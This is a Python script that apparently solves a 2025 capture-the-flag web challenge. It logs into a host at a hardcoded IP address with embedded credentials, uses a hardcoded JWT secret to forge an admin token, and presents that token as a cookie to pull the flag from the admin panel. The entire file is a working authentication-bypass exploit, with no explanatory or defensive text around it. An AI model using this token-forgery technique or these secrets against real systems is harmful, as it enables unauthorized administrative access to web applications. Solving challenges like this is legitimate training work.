#!/usr/bin/env python3
import requests
import base64
import jwt
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta

base_url = "http://15.206.47.5.nip.io:8443/"
username = "tuhin1729"
password = "123456"
jwt_secret = "str!k3b4nk@1009%sup3r!s3cr37"

print(f"[*] Base URL: {base_url}")
print(f"[*] Username: {username}")
print(f"[*] JWT Secret: {jwt_secret}")

print(f"\n[*] Logging in...")
login_url = f"{base_url}/login.php"
session = requests.Session()
login_data = {"username": username, "password": password}
r = session.post(login_url, data=login_data, allow_redirects=False)

print("[*] Forging admin JWT token...")
future_exp = int((datetime.now() + timedelta(days=1)).timestamp())
admin_payload = {"username": "admin", "exp": future_exp}
admin_token = jwt.encode(admin_payload, jwt_secret, algorithm="HS256")

print(f"[*] Admin JWT: {admin_token}")

print(f"\n[*] Accessing admin panel...")
admin_url = f"{base_url}/index.php"
headers = {"Cookie": f"auth={admin_token}"}
r = requests.get(admin_url, headers=headers)

flag_pattern = "ClOuDsEk_ReSeArCH_tEaM_CTF_2025{"
if flag_pattern in r.text:
    start = r.text.find(flag_pattern)
    end = r.text.find("}", start) + 1
    flag = r.text[start:end]
    print(f"\n[+] Flag: {flag}")
else:
    print("\n[-] Flag not found in response")
    print(r.text[:500])

